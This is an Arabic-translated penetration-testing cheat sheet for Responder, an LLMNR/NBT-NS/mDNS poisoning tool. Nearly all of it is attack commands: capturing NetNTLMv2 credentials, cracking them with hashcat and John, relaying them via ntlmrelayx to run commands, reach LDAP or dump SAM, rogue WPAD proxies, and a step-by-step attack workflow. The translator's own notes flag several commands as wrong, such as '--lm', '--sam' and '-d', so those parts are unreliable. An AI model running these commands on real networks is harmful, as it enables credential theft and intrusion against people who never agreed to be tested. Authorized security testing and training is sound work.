<a id="-responder---llmnrnbt-ns-poisoning"></a>
# 🎣 Responder - تسميم استجابات LLMNR/NBT-NS

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██████╗ ███████╗███████╗██████╗  ██████╗ ███╗   ██╗██████╗ ███████╗██████╗ 
  ██╔══██╗██╔════╝██╔════╝██╔══██╗██╔═══██╗████╗  ██║██╔══██╗██╔════╝██╔══██╗
  ██████╔╝█████╗  ███████╗██████╔╝██║   ██║██╔██╗ ██║██║  ██║█████╗  ██████╔╝
  ██╔══██╗██╔══╝  ╚════██║██╔═══╝ ██║   ██║██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗
  ██║  ██║███████╗███████║██║     ╚██████╔╝██║ ╚████║██████╔╝███████╗██║  ██║
  ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝
               LLMNR/NBT-NS/mDNS Poisoner
```

> يكتب الرسم النصي اسم الأداة بالإنجليزية؛ تشير كلمة Poisoner إلى إرسال إجابات مضللة لاستعلامات الأسماء لجذب اتصالات المصادقة.

<p align="center">
  <img src="https://img.shields.io/badge/Responder-NTLM_Capture-red?style=for-the-badge" alt="Responder">
  <img src="https://img.shields.io/badge/LLMNR-Poisoning-blue?style=for-the-badge" alt="LLMNR">
</p>

---

<a id="-table-of-contents"></a>
## 📋 المحتويات

- [ما هو Responder](#-what-is-responder)
- [التثبيت](#-installation)
- [الاستخدام الأساسي](#-basic-usage)
- [التقاط بيانات مصادقة NTLMv2](#-capture-ntlmv2-hashes)
- [هجمات ترحيل المصادقة (Relay)](#-relay-attacks)
- [خوادم مصادقة زائفة](#-rogue-servers)
- [الإعدادات](#-configuration)
- [مرجع سريع](#-quick-reference)

---

<a id="-what-is-responder"></a>
## 🎯 ما هو Responder

يسمّم **Responder** استجابات LLMNR وNBT-NS وmDNS لالتقاط بيانات مصادقة NTLM التي يصفها المصدر بالتجزئات:

- 🎣 **تسميم LLMNR** - تحويل الأسماء بالبث المتعدد على الرابط المحلي
- 📡 **تسميم NBT-NS** - خدمة أسماء NetBIOS
- 🍎 **تسميم mDNS** - خدمة DNS بالبث المتعدد
- 🔓 **التقاط بيانات المصادقة** - بيانات مصادقة NTLMv1/NTLMv2
- 🔄 **دعم ترحيل المصادقة** - هجمات ترحيل مصادقة NTLM

<a id="how-it-works"></a>
### كيف يعمل

```
1. يكتب المستخدم اسم مضيف خاطئًا: \\fileservr (خطأ مطبعي)
2. يفشل DNS في تحويل الاسم إلى عنوان
3. يرسل Windows استعلام LLMNR/NBT-NS بالبث العام
4. يجيب Responder: "I'm fileservr!"
5. ترسل الضحية بيانات مصادقة NTLM، التي يصفها المصدر بأنها hash
6. تُلتقط بيانات المصادقة لاختبار كلمة المرور أو ترحيل المصادقة
```

> **توضيح للمصطلح:** المقصود عادةً بيانات تحدّي واستجابة NetNTLMv1/NetNTLMv2، لا تجزئة كلمة مرور NTLM المحلية نفسها. وترحيل المصادقة تفاعل أثناء الاتصال، وليس مجرد إعادة استخدام ملف استجابة محفوظ. [تسميات Hashcat الرسمية](https://hashcat.net/wiki/doku.php?id=example_hashes)، [وصف ntlmrelayx الرسمي](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py).

---

<a id="-installation"></a>
## 🚀 التثبيت

<a id="kali-linux"></a>
### Kali Linux

```bash
# مثبّت مسبقًا
responder --help

# التحديث
sudo apt update && sudo apt install responder

# أو من GitHub
git clone https://github.com/lgandx/Responder.git
cd Responder
python Responder.py --help
```

<a id="verify"></a>
### التحقق

```bash
responder --help
responder -I eth0 --version
```

---

<a id="-basic-usage"></a>
## 💻 الاستخدام الأساسي

<a id="start-responder"></a>
### بدء Responder

```bash
# الوضع الأساسي (التقاط بيانات المصادقة)
sudo responder -I eth0

# خرج تفصيلي
sudo responder -I eth0 -v

# وضع التحليل غير النشط
sudo responder -I eth0 -A
```

<a id="interface-selection"></a>
### اختيار الواجهة

```bash
# واجهة Ethernet
sudo responder -I eth0

# واجهة لاسلكية
sudo responder -I wlan0

# عرض الواجهات
ip a
```

---

<a id="-capture-ntlmv2-hashes"></a>
## 🔓 التقاط بيانات مصادقة NTLMv2

<a id="basic-capture"></a>
### التقاط أساسي

```bash
# بدء Responder
sudo responder -I eth0

# انتظار اتصال العملاء...
# الخرج:
[+] Listening for events...
[HTTP] NTLMv2 Client   : 192.168.1.100
[HTTP] NTLMv2 Username : DOMAIN\user
[HTTP] NTLMv2 Hash     : user::DOMAIN:1122334455667788:...
```

> المثال أعلاه يبدأ Responder وينتظر اتصالات العملاء، ثم يعرض حالة الاستماع وعنوان العميل واسم المستخدم واستجابة المصادقة. بقيت أسطر الخرج وقيمها حرفيًا كما في المصدر.

<a id="force-ntlmv2"></a>
### فرض NTLMv2

```bash
# NTLMv2 فقط (يوصي به المصدر لاختبار كلمة المرور)
sudo responder -I eth0 --lm
```

> **تصحيح:** لا يفرض `--lm` استخدام NTLMv2؛ يصفه المصدر الرسمي بأنه طلب خفض المصادقة إلى LM للأنظمة القديمة. احتُفظ بالمثال المخالف كما ورد. [تعريف الخيار الرسمي](https://github.com/lgandx/Responder/blob/master/Responder.py).

<a id="wpad-capture"></a>
### الالتقاط عبر WPAD

```bash
# تفعيل وكيل WPAD
sudo responder -I eth0 -w

# فرض مصادقة WPAD
sudo responder -I eth0 -wF
```

<a id="hash-locations"></a>
### مواضع حفظ بيانات المصادقة

```bash
# تُحفظ بيانات المصادقة الملتقطة في:
/usr/share/responder/logs/
# أو
./logs/

# الملفات:
Responder-Session.log
SMB-NTLMv2-*.txt
HTTP-NTLMv2-*.txt
```

<a id="crack-captured-hashes"></a>
### اختبار كلمات المرور من البيانات الملتقطة

```bash
# تنسيق NTLMv2:
# user::DOMAIN:ServerChallenge:NTProofStr:NTLMv2Response

# Hashcat (الوضع 5600)
hashcat -m 5600 hash.txt wordlist.txt

# John
john --format=netntlmv2 hash.txt
```

---

<a id="-relay-attacks"></a>
## 🔄 هجمات ترحيل المصادقة (Relay)

<a id="disable-smbhttp-for-relay"></a>
### تعطيل SMB/HTTP لاستخدام الترحيل

```bash
# تعديل Responder.conf
sudo nano /usr/share/responder/Responder.conf

# تعيين:
SMB = Off
HTTP = Off
```

<a id="responder--ntlmrelayx"></a>
### استخدام Responder مع ntlmrelayx

```bash
# الطرفية 1: Responder دون SMB/HTTP
sudo responder -I eth0

# الطرفية 2: ntlmrelayx
impacket-ntlmrelayx -tf targets.txt -smb2support

# أو مع تنفيذ أمر
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
```

<a id="relay-to-ldap"></a>
### ترحيل المصادقة إلى LDAP

```bash
# Responder
sudo responder -I eth0

# ترحيل المصادقة إلى LDAP
impacket-ntlmrelayx -t ldap://DC01.domain.local
```

<a id="relay-for-sam-dump"></a>
### الترحيل لاستخراج SAM

```bash
# استخراج SAM عبر الترحيل
impacket-ntlmrelayx -tf targets.txt -smb2support --sam
```

> **ملاحظة للإصدار:** لا يعرّف محلّل ntlmrelayx الرسمي الذي تمت مراجعته خيارًا باسم `--sam`؛ يصف استخراج SAM كتصرف مرتبط بسياق SMB وصلاحيات الجلسة وخيارات التشغيل. بقي السطر الأصلي دون تغيير. [مصدر ntlmrelayx الرسمي](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py).

---

<a id="-rogue-servers"></a>
## 🖥️ خوادم مصادقة زائفة

<a id="built-in-servers"></a>
### الخوادم المضمّنة

| الخادم | المنفذ | الغرض |
|--------|------|---------|
| SMB | 445 | مصادقة مشاركة الملفات |
| HTTP | 80 | مصادقة الويب |
| HTTPS | 443 | ويب آمن |
| FTP | 21 | مصادقة FTP |
| SQL | 1433 | مصادقة MSSQL |
| LDAP | 389 | مصادقة خدمة الدليل |
| WPAD | 80 | إعداد الوكيل Proxy |

<a id="enabledisable-servers"></a>
### تفعيل الخوادم أو تعطيلها

```bash
# تعديل Responder.conf
[Responder Core]
; الخوادم التي تُشغّل
SQL = On
SMB = On
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On
```

<a id="wpad-rogue-proxy"></a>
### وكيل WPAD زائف

```bash
# تفعيل WPAD
sudo responder -I eth0 -w

# فرض مصادقة Basic على WPAD
sudo responder -I eth0 -wF

# سكربت WPAD مخصص
sudo responder -I eth0 -w --wpad-name wpad.dat
```

> **تصحيح WPAD:** يفرض `-F` المصادقة عند طلب wpad.dat، أما اختيار HTTP Basic فتتحكم فيه `-b`؛ لا يعني `-wF` وحده فرض Basic. ولم يظهر `--wpad-name` في المحلّل الرسمي الذي تمت مراجعته، لذا فمثاله مرتبط بوصف غير موثّق هنا. [خيارات Responder الرسمية](https://github.com/lgandx/Responder/blob/master/Responder.py).

<a id="dns-spoofing"></a>
### انتحال DNS

```bash
# تفعيل DNS
sudo responder -I eth0 -d

# يعمل Responder كخادم DNS
# يجيب عن استعلامات جميع المضيفين
```

> **تصحيح DNS:** يفعّل `-d` تسميم DHCPv4 المرتبط بـ WPAD، وليس خادم DNS مباشرةً كما تصفه أمثلة المصدر وجدول الخيارات. يُضبط خادم DNS في ملف الإعدادات. [محلّل الخيارات الرسمي](https://github.com/lgandx/Responder/blob/master/Responder.py)، [ملف الإعدادات الرسمي](https://github.com/lgandx/Responder/blob/master/Responder.conf).

---

<a id="-configuration"></a>
## ⚙️ الإعدادات

<a id="responderconf"></a>
### Responder.conf

```bash
# الموضع
/usr/share/responder/Responder.conf
# أو
./Responder.conf
```

<a id="key-settings"></a>
### الإعدادات الرئيسية

```ini
[Responder Core]
; التعيين إلى On أو Off
SQL = On
SMB = On
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On

; قيمة تحدٍّ مخصصة لجداول Rainbow
Challenge = Random

; عدم الإجابة عن الاستعلامات المحلية
DontRespondTo =

; الإجابة عن عناوين IP هذه فقط
RespondTo =
```

> **توضيح للإعداد:** يحدّد DontRespondTo عناوين IP المستثناة من الرد، وليس استثناء جميع الاستعلامات المحلية تلقائيًا. بقيت المفاتيح والقيم كما في المصدر. [ملف الإعدادات الرسمي](https://github.com/lgandx/Responder/blob/master/Responder.conf).

<a id="static-challenge-rainbow-tables"></a>
### قيمة تحدٍّ ثابتة (جداول Rainbow)

```ini
; تعيين تحدٍّ ثابت للجداول المحسوبة مسبقًا
Challenge = 1122334455667788
```

<a id="exclusions"></a>
### الاستثناءات

```ini
; عدم الإجابة عن عناوين IP هذه
DontRespondTo = 192.168.1.1, 192.168.1.2

; الإجابة عن هذه العناوين فقط
RespondTo = 192.168.1.100, 192.168.1.101
```

---

<a id="-quick-reference"></a>
## 📊 مرجع سريع

<a id="essential-commands"></a>
### الأوامر الأساسية

| الأمر | الوصف |
|---------|-------------|
| `responder -I eth0` | التقاط أساسي |
| `responder -I eth0 -v` | وضع تفصيلي |
| `responder -I eth0 -A` | تحليل فقط |
| `responder -I eth0 -w` | تفعيل WPAD |
| `responder -I eth0 -wF` | فرض مصادقة WPAD |
| `responder -I eth0 -d` | تفعيل DNS |

<a id="flags"></a>
### الخيارات

| الخيار | الوصف |
|------|-------------|
| `-I` | الواجهة |
| `-v` | تفصيلي |
| `-A` | وضع التحليل غير النشط |
| `-w` | تفعيل WPAD |
| `-wF` | فرض مصادقة WPAD |
| `-d` | تفعيل DNS |
| `-f` | التعرف على الأجهزة من بصماتها |
| `-b` | استخدام مصادقة HTTP Basic |

<a id="hash-types"></a>
### أنواع بيانات المصادقة

| النوع | وضع Hashcat | تنسيق John |
|------|--------------|-------------|
| NTLMv1 | 5500 | netntlm |
| NTLMv2 | 5600 | netntlmv2 |

<a id="attack-workflow"></a>
### سير عمل الهجوم

```bash
# 1. بدء Responder
sudo responder -I eth0 -wFv

# 2. انتظار بيانات المصادقة
# تُحفظ بيانات المصادقة في ./logs/

# 3. اختبار كلمات المرور من بيانات المصادقة
hashcat -m 5600 ./logs/*NTLM*.txt rockyou.txt

# 4. أو ترحيل المصادقة (تعطيل SMB أولًا)
sudo responder -I eth0  # SMB=Off في ملف الإعدادات
impacket-ntlmrelayx -tf targets.txt -smb2support
```

<a id="relay-workflow"></a>
### سير عمل ترحيل المصادقة

```bash
# 1. تحديد أهداف لا تُلزم بتوقيع SMB
cme smb 10.10.10.0/24 --gen-relay-list relay.txt

# 2. ضبط Responder.conf
# SMB = Off
# HTTP = Off

# 3. بدء Responder
sudo responder -I eth0

# 4. بدء ترحيل المصادقة
impacket-ntlmrelayx -tf relay.txt -smb2support

# 5. انتظار المصادقة المرحّلة
```

---

<a id="-resources"></a>
## 📚 مصادر

- [مستودع Responder على GitHub](https://github.com/lgandx/Responder)
- [تسميم LLMNR](https://blog.fox-it.com/2017/05/09/relaying-credentials-everywhere-with-ntlmrelayx/)
- [ntlmrelayx](https://github.com/fortra/impacket)

<a id="related-cheatsheets"></a>
### مراجع سريعة ذات صلة
- [Impacket](../../Impacket/translations/README.ar.md)
- [CrackMapExec](../../CrackMapExec/translations/README.ar.md)
- [Hashcat](../../Hashcat/translations/README.ar.md)

---

<p align="center">
  <b>🎣 فهم التقاط بيانات المصادقة!</b><br>
  <i>Responder - أداة جمع بيانات المصادقة من الشبكة</i>
</p>
